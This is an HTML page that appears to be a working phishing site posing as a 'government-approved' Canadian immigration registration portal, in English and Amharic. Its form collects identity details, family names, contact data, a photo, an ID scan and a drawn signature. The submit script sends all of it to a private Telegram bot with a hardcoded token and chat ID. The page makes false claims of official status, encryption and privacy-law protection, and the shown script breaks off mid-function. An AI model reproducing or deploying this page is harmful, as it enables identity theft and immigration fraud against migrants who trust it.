<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Canada Registration Form</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    /* CSS Variables for Consistency */
    :root {
      --primary-color: #D80621; /* Canadian red */
      --secondary-color: #FFFFFF; /* White */
      --accent-color: #F5F5F5; /* Light gray */
      --text-color: black; /* Dark gray */
    }

    /* Base Styles */
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: url('https://upload.wikimedia.org/wikipedia/en/c/cf/Flag_of_Canada.svg') no-repeat center center fixed;
      background-size: cover;
      color: var(--text-color);
    }

    .overlay {
      background: rgba(0, 0, 0, 0.3);
      min-height: 100vh;
      padding: 20px;
    }

    .container {
      max-width: 900px;
      margin: 0 auto;
      padding: 20px;
    }

    /* Header Styles */
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 20px;
      background-color: White;
      border-radius: 30px;
      margin-bottom: 20px;
    }

    .language-switcher select {
      padding: 10px;
      border-radius: 400px;
    }

    .date-time {
      font-size: 14px;
    }

    /* Intro Page Styles */
    .intro {
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
    }

    .hero {
      margin-bottom: 40px;
    }

    .hero h1 {
      font-size: 76px;
      color: White;
      margin: 0;
    }

    .hero p {
      font-size: 18px;
      color: var(--text-color);
    }

    .trust-banner, .note-block {
      background: #57ef7779;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
    }

    .emoji {
      margin-right: 5px;
    }

    .process-steps {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 20px;
      margin-bottom: 40px;
    }

    .process-step {
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 15px;
      background: #ffffffb5;
      border-radius: 8px;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }

    .process-step i {
      font-size: 48px;
      color: var(--primary-color);
      margin-bottom: 10px;
    }

    .process-step p {
      font-size: 16px;
      margin: 0;
    }

    .cta button {
      background-color: var(--primary-color);
      color: var(--secondary-color);
      font-size: 18px;
      padding: 15px 30px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    .cta button:hover {
      background-color: #A8051A;
    }

    /* Login Page Styles */
    #loginPage {
      display: none;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      flex-direction: column;
    }

    .login-form {
      background-color: var(--accent-color);
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
    }

    .login-form h2 {
      text-align: center;
      margin-bottom: 20px;
      color: var(--primary-color);
    }

    #loginError {
      display: none;
      color: #d32f2f;
      text-align: center;
      margin-bottom: 15px;
      font-size: 14px;
    }

    .input-group {
      position: relative;
      margin-bottom: 20px;
    }

    .input-group input {
      width: 100%;
      padding: 10px 10px 10px 40px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 16px;
      box-sizing: border-box;
    }

    .input-group i {
      position: absolute;
      left: 10px;
      top: 50%;
      transform: translateY(-50%);
      color: black;
    }

    .login-form button {
      width: 100%;
      background-color: var(--primary-color);
      color: var(--secondary-color);
      padding: 12px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
      transition: background-color 0.3s;
    }

    .login-form button:hover {
      background-color: #A8051A;
    }

    .login-tips {
      margin-top: 15px;
      font-size: 14px;
      text-align: center;
    }

    .login-tips a {
      color: #43a047;
      text-decoration: underline;
    }

    /* Form Page Styles */
    #formPage {
      display: none;
    }

    #spinner {
      display: none;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .header-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
    }

    .form-title {
      font-size: 14px;
      font-weight: 600;
      color: White;
    }

    .form-subtitle {
      font-size: 10px;
      color: black;
    }

    .photo-box {
      position: relative;
      width: 150px;
      height: 150px;
      border: 2px dashed #ccc;
      text-align: center;
    }

    #photoInput {
      position: absolute;
      width: 100%;
      height: 100%;
      opacity: 0;
      cursor: pointer;
    }

    #photoPreview {
      display: none;
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    #photoLabel {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      color: #666;
    }

    .note {
      font-size: 12px;
      color: black;
      margin-bottom: 20px;
    }

    fieldset {
      border: 1px solid #ddd;
      padding: 10px;
      margin-bottom: 30px;
      border-radius: 5px;
    }

    legend {
      font-weight: 600;
      color: var(--primary-color);
    }

    label {
      display: block;
      margin: 10px 0 5px;
      font-weight: 600;
    }

    input, select {
      width: 100%;
      padding: 8px;
      margin-bottom: 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
    }

    .row {
      display: flex;
      gap: 20px;
      flex-wrap: wrap;
    }

    .row > div {
      flex: 1;
      min-width: 200px;
    }

    .accompanied-header {
      display: flex;
      font-weight: 600;
      margin-bottom: 10px;
    }

    .accompanied-header > div {
      flex: 1;
    }

    .accompanied-row {
      display: flex;
      gap: 20px;
      margin-bottom: 10px;
    }

    .accompanied-row input {
      flex: 1;
      min-width: 0;
    }

    .signature-section {
      display: flex;
      gap: 20px;
      flex-wrap: wrap;
      align-items: flex-start;
      margin: 20px 0;
    }

    .signature-box {
      flex: 1;
      min-width: 300px;
    }

    #signature {
      border: 1px solid #ccc;
      display: block;
      margin: 10px 0;
      background: white;
    }

    .clear-btn {
      background: #d32f2f;
      color: white;
      padding: 5px 10px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    .clear-btn:hover {
      background: #c62828;
    }

    .submit-btn {
      width: 100%;
      padding: 15px;
      font-size: 16px;
      background-color: var(--primary-color);
      color: var(--secondary-color);
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    .disclaimer {
      font-size: 12px;
      color: black;
      margin-top: 20px;
      text-align: center;
    }

    /* Fade Animation */
    .fade-in {
      animation: fadeIn 0.5s ease-in;
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    /* Modal Styles */
    #submissionModal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.5);
      display: none;
      justify-content: center;
      align-items: center;
    }

    .modal-content {
      background: white;
      padding: 30px;
      border-radius: 10px;
      text-align: center;
      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
      opacity: 0;
      transition: opacity 0.3s;
    }

    #submissionModal.show .modal-content {
      opacity: 1;
    }

    .close-btn {
      position: absolute;
      top: 10px;
      right: 10px;
      font-size: 24px;
      cursor: pointer;
    }

    .close-btn:hover {
      color: red;
    }

    .checkmark {
      width: 60px;
      height: 30px;
      border-left: 10px solid green;
      border-bottom: 10px solid green;
      transform: rotate(-45deg);
      margin: 20px auto;
      animation: scaleIn 0.5s ease-out forwards;
    }

    @keyframes scaleIn {
      from { transform: scale(0) rotate(-45deg); }
      to { transform: scale(1) rotate(-45deg); }
    }

    .modal-content h2 {
      color: green;
      font-size: 24px;
      margin-bottom: 10px;
    }

    .celebration {
      font-size: 24px;
      color: #2e7d32;
      font-weight: bold;
    }

    /* Responsive Design */
    @media (max-width: 600px) {
      .hero h1 { font-size: 28px; }
      .hero p { font-size: 16px; }
      .process-step i { font-size: 36px; }
      .process-step p { font-size: 14px; }
      .cta button { padding: 12px 20px; font-size: 16px; }
      .login-form { padding: 20px; }
    }
  </style>
</head>
<body>
  <div class="overlay">
    <div class="container">
      <!-- Intro Page -->
      <div class="intro" id="introPage">
        <div class="header">
          <div class="language-switcher">
            <label for="languageSelectIntro" data-translate="languageLabel">Language: </label>
            <select id="languageSelectIntro">
              <option value="en" data-translate="englishOption">English</option>
              <option value="am" data-translate="amharicOption">Amharic</option>
            </select>
          </div>
          <div class="date-time" id="dateTimeIntro"></div>
        </div>
        <div class="hero">
          <h1 data-translate="welcome">Welcome</h1>
          <p data-translate="heroDescription">Start your journey to Canada today!</p>
        </div>
        <div class="trust-banner">
          <span class="emoji">🔒</span>
          <span data-translate="trustBanner">Secure and Trusted Platform</span>
        </div>
        <div class="note-block">
          <span class="emoji">✅</span>
          <span data-translate="officialNote">
            <b>Official & Trusted:</b> This portal is government-approved. Your data is encrypted and never shared without your consent.
          </span>
        </div>
        <div class="process-steps">
          <div class="process-step">
            <i class="fas fa-user"></i>
            <p data-translate="step1">Log in using your secure credentials</p>
          </div>
          <div class="process-step">
            <i class="fas fa-pencil-alt"></i>
            <p data-translate="step2">Fill in your personal and family information. Upload a recent photo for identification and an ID</p>
          </div>
          <div class="process-step">
            <i class="fas fa-check"></i>
            <p data-translate="step3">Confirm your details and sign electronically</p>
          </div>
          <div class="process-step">
            <i class="fas fa-paper-plane"></i>
            <p data-translate="step4">Submit your registration. Your data is reviewed by our trusted Canadian immigration team</p>
          </div>
          <div class="process-step">
            <i class="fas fa-envelope"></i>
            <p data-translate="step5">You will receive a confirmation email and Telegram notification</p>
          </div>
        </div>
        <div class="cta">
          <button id="startBtn" data-translate="startButton">Get Started</button>
        </div>
      </div>

      <!-- Login Page -->
      <div id="loginPage" style="display:none;">
        <div class="header">
          <div class="language-switcher">
            <label for="languageSelectLogin" data-translate="languageLabel">Language: </label>
            <select id="languageSelectLogin">
              <option value="en" data-translate="englishOption">English</option>
              <option value="am" data-translate="amharicOption">Amharic</option>
            </select>
          </div>
          <div class="date-time" id="dateTimeLogin"></div>
        </div>
        <form id="loginForm" class="login-form" autocomplete="off">
          <h2 data-translate="loginTitle">Login to Continue</h2>
          <div id="loginError" data-translate="loginError">Invalid username or password</div>
          <div class="input-group">
            <i class="fas fa-user"></i>
            <input type="text" id="usernameInput" placeholder="Enter username" required autocomplete="username" data-translate-placeholder="usernamePlaceholder" />
          </div>
          <div class="input-group">
            <i class="fas fa-lock"></i>
            <input type="password" id="passwordInput" placeholder="Enter password" required autocomplete="current-password" data-translate-placeholder="passwordPlaceholder" />
          </div>
          <button type="submit" data-translate="loginButton">Login</button>
          <div class="login-tips">
            <span class="emoji">🔑</span>
            <span data-translate="loginHelp">Need help? Contact our <a href="mailto:support@canada.ca" style="color:#43a047;text-decoration:underline;">support team</a>.</span>
          </div>
        </form>
      </div>

      <!-- Form Page -->
      <div id="formPage" style="display:none;">
        <div class="header">
          <div class="language-switcher">
            <label for="languageSelectForm" data-translate="languageLabel">Language: </label>
            <select id="languageSelectForm">
              <option value="en" data-translate="englishOption">English</option>
              <option value="am" data-translate="amharicOption">Amharic</option>
            </select>
          </div>
          <div class="date-time" id="dateTimeForm"></div>
        </div>
        <div id="spinner"></div>
        <div class="header-row">
          <div>
            <div class="form-title" data-translate="formTitle">Canada Registration Form</div>
            <div class="form-subtitle" data-translate="formSubtitle">Department of Citizenship & Immigration</div>
          </div>
          <div class="photo-box" id="photoBox">
            <input type="file" name="photo" id="photoInput" accept="image/*" required>
            <img id="photoPreview" alt="Photo Preview">
            <span id="photoLabel" data-translate="photoLabel">PHOTO</span>
          </div>
        </div>
        <p class="note" data-translate="photoNote">Please upload a recent passport-style photo (JPG, PNG, max 2MB)</p>
        <form id="canadaRegForm" autocomplete="off">
          <fieldset>
            <legend data-translate="personalInfoLegend">PERSONAL INFORMATION</legend>
            <div class="row">
              <div>
                <label data-translate="fullNameLabel">Full Name</label>
                <input type="text" name="fullName" required data-translate-placeholder="fullNamePlaceholder">
              </div>
              <div>
                <label data-translate="fatherNameLabel">Father's Name</label>
                <input type="text" name="fatherName" data-translate-placeholder="fatherNamePlaceholder">
              </div>
              <div>
                <label data-translate="motherNameLabel">Mother's Name</label>
                <input type="text" name="motherName" data-translate-placeholder="motherNamePlaceholder">
              </div>
            </div>
            <div class="row">
              <div>
                <label data-translate="genderLabel">Gender</label>
                <select name="gender" required>
                  <option value="" data-translate="selectOption">Select...</option>
                  <option data-translate="maleOption">Male</option>
                  <option data-translate="femaleOption">Female</option>
                  <option data-translate="otherOption">Other</option>
                </select>
              </div>
              <div>
                <label data-translate="dobLabel">Date of Birth</label>
                <input type="date" name="dob">
              </div>
              <div>
                <label data-translate="nationalityLabel">Nationality</label>
                <input type="text" name="nationality" data-translate-placeholder="nationalityPlaceholder">
              </div>
            </div>
            <div class="row">
              <div>
                <label data-translate="birthPlaceLabel">Place of Birth</label>
                <input type="text" name="birthPlace" data-translate-placeholder="birthPlacePlaceholder">
              </div>
              <div>
                <label data-translate="idNumberLabel">Identification Number</label>
                <input type="text" name="idNumber" data-translate-placeholder="idNumberPlaceholder">
              </div>
            </div>
          </fieldset>
          <fieldset>
            <legend data-translate="accompaniedLegend">ACCOMPANIED BY (If applicable)</legend>
            <div class="accompanied-header">
              <div data-translate="nameHeader">Name</div>
              <div data-translate="relationshipHeader">Relationship</div>
            </div>
            <div class="accompanied-row">
              <input type="text" name="accompaniedName1" data-translate-placeholder="namePlaceholder">
              <input type="text" name="accompaniedRel1" data-translate-placeholder="relationshipPlaceholder">
            </div>
            <div class="accompanied-row">
              <input type="text" name="accompaniedName2" data-translate-placeholder="namePlaceholder">
              <input type="text" name="accompaniedRel2" data-translate-placeholder="relationshipPlaceholder">
            </div>
            <div class="accompanied-row">
              <input type="text" name="accompaniedName3" data-translate-placeholder="namePlaceholder">
              <input type="text" name="accompaniedRel3" data-translate-placeholder="relationshipPlaceholder">
            </div>
          </fieldset>
          <fieldset>
            <legend data-translate="contactLegend">CONTACT & ADDRESS</legend>
            <input type="text" name="address" placeholder="Permanent Address" style="margin-bottom:10px;" data-translate-placeholder="addressPlaceholder">
            <div class="row">
              <div>
                <label data-translate="phoneLabel">Phone Number</label>
                <input type="tel" name="phone" data-translate-placeholder="phonePlaceholder">
              </div>
              <div>
                <label data-translate="emailLabel">Email</label>
                <input type="email" name="email" data-translate-placeholder="emailPlaceholder">
              </div>
            </div>
          </fieldset>
          <fieldset>
            <legend data-translate="idUploadLegend">UPLOAD IDENTIFICATION</legend>
            <div>
              <label data-translate="idUploadLabel">Upload ID (passport, national ID, etc.)</label>
              <input type="file" name="idUpload" id="idUpload" accept="image/*,.pdf" required>
            </div>
            <p class="note" data-translate="idNote">Accepted IDs: passport, national ID, driver's license (JPG, PNG, PDF, max 5MB)</p>
          </fieldset>
          <div class="signature-section">
            <div>
              <label data-translate="dateLabel">Date</label>
              <input type="date" name="applicationDate" style="width:160px;">
            </div>
            <div class="signature-box">
              <label style="font-weight:600;" data-translate="signatureLabel">Signature of Applicant</label>
              <p class="note" data-translate="signatureNote">Please sign within the box using your mouse or touch screen.</p>
              <canvas id="signature" width="350" height="80"></canvas>
              <button type="button" class="clear-btn" id="clearSignatureBtn" data-translate="clearSignatureButton">Clear Signature</button>
            </div>
          </div>
          <p class="note" data-translate="submissionNote">Note: Your uploaded photo, ID, and signature will be sent directly to the Canadian immigration team for review. You will not receive copies of these files.</p>
          <button type="submit" class="submit-btn" data-translate="submitButton">Submit Registration</button>
          <p class="disclaimer" data-translate="disclaimer">Your data is protected under the Canadian Privacy Act. <a href="#">Learn more</a></p>
        </form>
      </div>

      <!-- Submission Modal -->
      <div id="submissionModal">
        <div class="modal-content">
          <span class="close-btn" id="closeModal">×</span>
          <h2 data-translate="successHeading">Success!</h2>
          <div class="checkmark"></div>
          <p id="submissionMessage"></p>
        </div>
      </div>
    </div>
  </div>

  <script>
    // Translations object with added keys from the first code
    const translations = {
      en: {
        languageLabel: "Language: ",
        englishOption: "English",
        amharicOption: "Amharic",
        welcome: "Welcome",
        heroDescription: "Start your journey to Canada today!",
        trustBanner: "Secure and Trusted Platform",
        officialNote: "<b>Official & Trusted:</b> This portal is government-approved. Your data is encrypted and never shared without your consent.",
        step1: "Log in using your secure credentials",
        step2: "Fill in your personal and family information. Upload a recent photo for identification and an ID",
        step3: "Confirm your details and sign electronically",
        step4: "Submit your registration. Your data is reviewed by our trusted Canadian immigration team",
        step5: "You will receive a confirmation email and Telegram notification",
        startButton: "Get Started",
        loginTitle: "Login to Continue",
        loginError: "Invalid username or password",
        usernamePlaceholder: "Enter username",
        passwordPlaceholder: "Enter password",
        loginButton: "Login",
        loginHelp: "Need help? Contact our <a href='mailto:support@canada.ca' style='color:#43a047;text-decoration:underline;'>support team</a>.",
        formTitle: "Canada Registration Form",
        formSubtitle: "Department of Citizenship & Immigration",
        photoLabel: "PHOTO",
        photoNote: "Please upload a recent passport-style photo (JPG, PNG, max 2MB)",
        personalInfoLegend: "PERSONAL INFORMATION",
        fullNameLabel: "Full Name",
        fullNamePlaceholder: "Enter full name",
        fatherNameLabel: "Father's Name",
        fatherNamePlaceholder: "Enter father's name",
        motherNameLabel: "Mother's Name",
        motherNamePlaceholder: "Enter mother's name",
        genderLabel: "Gender",
        selectOption: "Select...",
        maleOption: "Male",
        femaleOption: "Female",
        otherOption: "Other",
        dobLabel: "Date of Birth",
        nationalityLabel: "Nationality",
        nationalityPlaceholder: "Enter nationality",
        birthPlaceLabel: "Place of Birth",
        birthPlacePlaceholder: "Enter place of birth",
        idNumberLabel: "Identification Number",
        idNumberPlaceholder: "Enter ID number",
        accompaniedLegend: "ACCOMPANIED BY (If applicable)",
        nameHeader: "Name",
        relationshipHeader: "Relationship",
        namePlaceholder: "Name",
        relationshipPlaceholder: "Relationship",
        contactLegend: "CONTACT & ADDRESS",
        addressPlaceholder: "Permanent Address",
        phoneLabel: "Phone Number",
        phonePlaceholder: "Enter phone number",
        emailLabel: "Email",
        emailPlaceholder: "Enter email",
        idUploadLegend: "UPLOAD IDENTIFICATION",
        idUploadLabel: "Upload ID (passport, national ID, etc.)",
        idNote: "Accepted IDs: passport, national ID, driver's license (JPG, PNG, PDF, max 5MB)",
        dateLabel: "Date",
        signatureLabel: "Signature of Applicant",
        signatureNote: "Please sign within the box using your mouse or touch screen.",
        clearSignatureButton: "Clear Signature",
        submissionNote: "Note: Your uploaded photo, ID, and signature will be sent directly to the Canadian immigration team for review. You will not receive copies of these files.",
        submitButton: "Submit Registration",
        disclaimer: "Your data is protected under the Canadian Privacy Act. <a href='#'>Learn more</a>",
        successHeading: "Success!",
        submissionSuccess: "<span class='celebration'>🎉 Congratulations, {fullName}!</span> Your registration has been successfully submitted. We have received your photo, ID, and signature, and our immigration team will review them soon. You will be contacted regarding the next steps. Rest assured, your information is secure and handled by authorized personnel only. If you have any questions, please contact our support team at +1-800-123-4567."
      },
      am: {
        languageLabel: "ቋንቋ: ",
        englishOption: "እንግሊዝኛ",
        amharicOption: "አማርኛ",
        welcome: "እንኳን ደህና መጡ",
        heroDescription: "ወደ ካናዳ ጉዞዎን ዛሬ ይጀምሩ!",
        trustBanner: "ደህንነቱ የተጠበቀ እና የታመነ መድረክ",
        officialNote: "<b>ኦፊሴላዊ እና የታመነ:</b> ይህ ፖርታል በመንግስት የተፈቀደ ነው። የእርስዎ ውሂብ ተመስጥሮ የተጠበቀ እና ያለ እርስዎ ፈቃድ አይጋራም።",
        step1: "ደህንነቱ የተጠበቀ ምስክርነቶችን በመጠቀም ይግቡ",
        step2: "የግል እና የቤተሰብ መረጃዎን ይሙሉ። ለመለየት የቅርብ ጊዜ ፎቶ እና መታወቂያ ይስቀሉ",
        step3: "ዝርዝሮችዎን ያረጋግጡ እና በኤሌክትሮኒክ ይፈርሙ",
        step4: "ምዝገባዎን ያስገቡ። የእርስዎ ውሂብ በታመነው የካናዳ ኢሚግሬሽን ቡድን ይገመገማል",
        step5: "የማረጋገጫ ኢሜይል እና የቴሌግራም ማሳወቂያ ይደርስዎታል",
        startButton: "ጀምር",
        loginTitle: "ይግቡ ለመቀጠል",
        loginError: "የተሳሳተ የተጠቃሚ ስም ወይም የይለፍ ቃል",
        usernamePlaceholder: "የተጠቃሚ ስም ያስገቡ",
        passwordPlaceholder: "የይለፍ ቃል ያስገቡ",
        loginButton: "ግባ",
        loginHelp: "እገዛ ይፈልጋሉ? የእኛን <a href='mailto:support@canada.ca' style='color:#43a047;text-decoration:underline;'>የድጋፍ ቡድን</a> ያነጋግሩ።",
        formTitle: "የካናዳ ምዝገባ ቅጽ",
        formSubtitle: "የዜግነት እና ኢሚግሬሽን መምሪያ",
        photoLabel: "ፎቶ",
        photoNote: "እባክዎ የቅርብ ጊዜ የፓስፖርት ዘይቤ ፎቶ ይስቀሉ (JPG፣ PNG፣ ከፍተኛ 2MB)",
        personalInfoLegend: "የግል መረጃ",
        fullNameLabel: "ሙሉ ስም",
        fullNamePlaceholder: "ሙሉ ስም ያስገቡ",
        fatherNameLabel: "የአባት ስም",
        fatherNamePlaceholder: "የአባት ስም ያስገቡ",
        motherNameLabel: "የእናት ስም",
        motherNamePlaceholder: "የእናት ስም ያስገቡ",
        genderLabel: "ጾታ",
        selectOption: "ይምረጡ...",
        maleOption: "ወንድ",
        femaleOption: "ሴት",
        otherOption: "ሌላ",
        dobLabel: "የትውልድ ቀን",
        nationalityLabel: "ዜግነት",
        nationalityPlaceholder: "ዜግነት ያስገቡ",
        birthPlaceLabel: "የትውልድ ቦታ",
        birthPlacePlaceholder: "የትውልድ ቦታ ያስገቡ",
        idNumberLabel: "የመታወቂያ ቁጥር",
        idNumberPlaceholder: "የመታወቂያ ቁጥር ያስገቡ",
        accompaniedLegend: "በአብሮነት (ከተፈቀደ)",
        nameHeader: "ስም",
        relationshipHeader: "ዝምድና",
        namePlaceholder: "ስም",
        relationshipPlaceholder: "ዝምድና",
        contactLegend: "የእውቂያ እና አድራሻ",
        addressPlaceholder: "ቋሚ አድራሻ",
        phoneLabel: "ስልክ ቁጥር",
        phonePlaceholder: "ስልክ ቁጥር ያስገቡ",
        emailLabel: "ኢሜይል",
        emailPlaceholder: "ኢሜይል ያስገቡ",
        idUploadLegend: "መታወቂያ ስቀል",
        idUploadLabel: "መታወቂያ ስቀል (ፓስፖርት፣ ብሄራዊ መታወቂያ፣ ወዘተ)",
        idNote: "ተቀባይነት ያላቸው መታወቂያዎች: ፓስፖርት፣ ብሄራዊ መታወቂያ፣ የመንጃ ፈቃድ (JPG፣ PNG፣ PDF፣ ከፍተኛ 5MB)",
        dateLabel: "ቀን",
        signatureLabel: "የአመልካች ፊርማ",
        signatureNote: "እባክዎ በአይጥ ወይም በንክኪ ስክሪን በመጠቀም በሳጥኑ ውስጥ ይፈርሙ።",
        clearSignatureButton: "ፊርማ አጽዳ",
        submissionNote: "ማስታወሻ: የተሰቀለው ፎቶ፣ መታወቂያ እና ፊርማ በቀጥታ ለካናዳ ኢሚግሬሽን ቡድን ለግምገማ ይላካል። የእነዚህ ፋይሎች ቅጂዎች አይቀበሉም።",
        submitButton: "ምዝገባ አስገባ",
        disclaimer: "የእርስዎ ውሂብ በካናዳ የግላዊነት ህግ የተጠበቀ ነው። <a href='#'>ተጨማሪ ይወቁ</a>",
        successHeading: "ተሳክቷል!",
        submissionSuccess: "<span class='celebration'>🎉 እንኳን ደስ አለዎት, {fullName}!</span> የእርስዎ ምዝገባ በተሳካ ሁኔታ ቀርቧል። የእርስዎን ፎቶ፣ መታወቂያ እና ፊርማ ተቀብለናል፣ እና የኢሚግሬሽን ቡድናችን በቅርቡ ይገመግማል። ስለ ቀጣይ እርምጃዎች ይገናኛሉ። እርግጠኛ ይሁኑ፣ የእርስዎ መረጃ ደህንነቱ የተጠበቀ እና በተፈቀደላቸው ሰራተኞች ብቻ ይታያል። ማንኛውም ጥያቄ ካለዎት፣ እባክዎ የእኛን የድጋፍ ቡድን በ+1-800-123-4567 ያነጋግሩ።"
      }
    };

    // DOM Elements
    const introPage = document.getElementById('introPage');
    const loginPage = document.getElementById('loginPage');
    const formPage = document.getElementById('formPage');
    const startBtn = document.getElementById('startBtn');
    const loginForm = document.getElementById('loginForm');
    const regForm = document.getElementById('canadaRegForm');
    const languageSelectIntro = document.getElementById('languageSelectIntro');
    const languageSelectLogin = document.getElementById('languageSelectLogin');
    const languageSelectForm = document.getElementById('languageSelectForm');
    const photoInput = document.getElementById('photoInput');
    const photoPreview = document.getElementById('photoPreview');
    const photoLabel = document.getElementById('photoLabel');
    const canvas = document.getElementById('signature');
    const ctx = canvas.getContext('2d');
    const clearSignatureBtn = document.getElementById('clearSignatureBtn');
    let currentLang = 'en';

    // Update Date-Time
    function updateDateTime() {
      const now = new Date();
      const options = {
        weekday: 'long',
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        timeZone: 'Africa/Nairobi'
      };
      const dateString = now.toLocaleString('en-US', options);
      document.getElementById('dateTimeIntro').textContent = dateString;
      document.getElementById('dateTimeLogin').textContent = dateString;
      document.getElementById('dateTimeForm').textContent = dateString;
    }
    updateDateTime();
    setInterval(updateDateTime, 60000);

    // Language Switcher Function
    function setLanguage(lang) {
      currentLang = lang;
      document.querySelectorAll('[data-translate]').forEach(element => {
        const key = element.getAttribute('data-translate');
        if (translations[lang][key]) {
          element.innerHTML = translations[lang][key];
        }
      });
      document.querySelectorAll('[data-translate-placeholder]').forEach(element => {
        const key = element.getAttribute('data-translate-placeholder');
        if (translations[lang][key]) {
          element.placeholder = translations[lang][key];
        }
      });
      document.querySelectorAll('option[data-translate]').forEach(option => {
        const key = option.getAttribute('data-translate');
        if (translations[lang][key]) {
          option.textContent = translations[lang][key];
        }
      });
      languageSelectIntro.value = lang;
      languageSelectLogin.value = lang;
      languageSelectForm.value = lang;
    }

    // Set Language Event Listeners
    languageSelectIntro.onchange = (e) => setLanguage(e.target.value);
    languageSelectLogin.onchange = (e) => setLanguage(e.target.value);
    languageSelectForm.onchange = (e) => setLanguage(e.target.value);
    setLanguage('en');

    // Page Transitions
    startBtn.onclick = () => {
      introPage.style.display = 'none';
      loginPage.style.display = 'flex';
      loginPage.classList.add('fade-in');
      setTimeout(() => loginPage.classList.remove('fade-in'), 500);
    };

    loginForm.onsubmit = (e) => {
      e.preventDefault();
      const username = document.getElementById('usernameInput').value;
      const password = document.getElementById('passwordInput').value;
      if (username === 'HIWET ESHETU' && password === '895152990') {
        loginPage.style.display = 'none';
        formPage.style.display = 'block';
        formPage.classList.add('fade-in');
        setTimeout(() => formPage.classList.remove('fade-in'), 500);
        document.querySelector('input[name="applicationDate"]').value = new Date().toISOString().split('T')[0];
      } else {
        document.getElementById('loginError').style.display = 'block';
      }
    };

    // Photo Preview
    photoInput.onchange = function() {
      const file = this.files[0];
      if (file) {
        photoPreview.src = URL.createObjectURL(file);
        photoPreview.style.display = 'block';
        photoLabel.style.display = 'none';
      }
    };

    // Signature Canvas
    let drawing = false;
    ctx.lineWidth = 2;
    ctx.lineCap = 'round';
    ctx.strokeStyle = '#000';

    function startDrawing(e) {
      drawing = true;
      const pos = getPosition(e);
      ctx.beginPath();
      ctx.moveTo(pos.x, pos.y);
    }

    function draw(e) {
      if (!drawing) return;
      const pos = getPosition(e);
      ctx.lineTo(pos.x, pos.y);
      ctx.stroke();
    }

    function stopDrawing() {
      drawing = false;
      ctx.closePath();
    }

    function getPosition(e) {
      const rect = canvas.getBoundingClientRect();
      if (e.touches) {
        return { x: e.touches[0].clientX - rect.left, y: e.touches[0].clientY - rect.top };
      }
      return { x: e.clientX - rect.left, y: e.clientY - rect.top };
    }

    canvas.onmousedown = startDrawing;
    canvas.onmousemove = draw;
    canvas.onmouseup = stopDrawing;
    canvas.onmouseout = stopDrawing;
    canvas.ontouchstart = (e) => { e.preventDefault(); startDrawing(e); };
    canvas.ontouchmove = (e) => { e.preventDefault(); draw(e); };
    canvas.ontouchend = stopDrawing;

    clearSignatureBtn.onclick = () => ctx.clearRect(0, 0, canvas.width, canvas.height);

    // Form Submission to Telegram
    regForm.onsubmit = async function(e) {
      e.preventDefault();
      document.getElementById('spinner').style.display = 'block';
      const formData = new FormData(this);
      const photoFile = photoInput.files[0];
      const idFile = document.getElementById('idUpload').files[0];
      const signatureData = canvas.toDataURL('image/png');

      const botToken = '8166170009:AAFj2ei7GEXCIpQ-8JY0Of5rBkyTQVIcW-4'; // Replace with your bot token
      const chatId = '8155585808'; // Replace with your chat ID
      const telegramUrl = `https://api.telegram.org/bot${botToken}/`;

      let message = '';
      for (const [key, value] of formData.entries()) {
        if (value && key !== 'photo' && key !== 'idUpload') {
          message += `${key}: ${value}\n`;
        }
      }

      await fetch(`${telegramUrl}sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
      });

      if (photoFile) {
        const photoFormData = new FormData();
        photoFormData.append('chat_id', chatId);
        photoFormData.append('photo', photoFile);
        await fetch(`${telegramUrl}sendPhoto`, { method: 'POST', body: photoFormData });
      }

      if (idFile) {
        const docFormData = new FormData();
        docFormData.append('chat_id', chatId);
        docFormData.append('document', idFile);
        await fetch(`${telegramUrl}sendDocument`, { method: 'POST', body: docFormData });
      }

      const signatureBlob = await (await fetch(signatureData)).blob();
      const sigFormData = new FormData();
      sigFormData.append('chat_id', chatId);
      sigFormData.append('photo', signatureBlob, 'signature.png');
      await fetch(`${telegramUrl}sendPhoto`, { method: 'POST', body: sigFormData });

      document.getElementById('spinner').style.display = 'none';

      const fullName = document.querySelector('input[name="fullName"]').value || 'Applicant';
      const messageTemplate = translations[currentLang].submissionSuccess;
      document.getElementById('submissionMessage').innerHTML = messageTemplate.replace('{fullName}', fullName);

      document.getElementById('submissionModal').style.display = 'block';
      setTimeout(() => {
        document.getElementById('submissionModal').classList.add('show');
      }, 10);

      regForm.reset();
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      photoPreview.style.display = 'none';
      photoLabel.style.display = 'block';
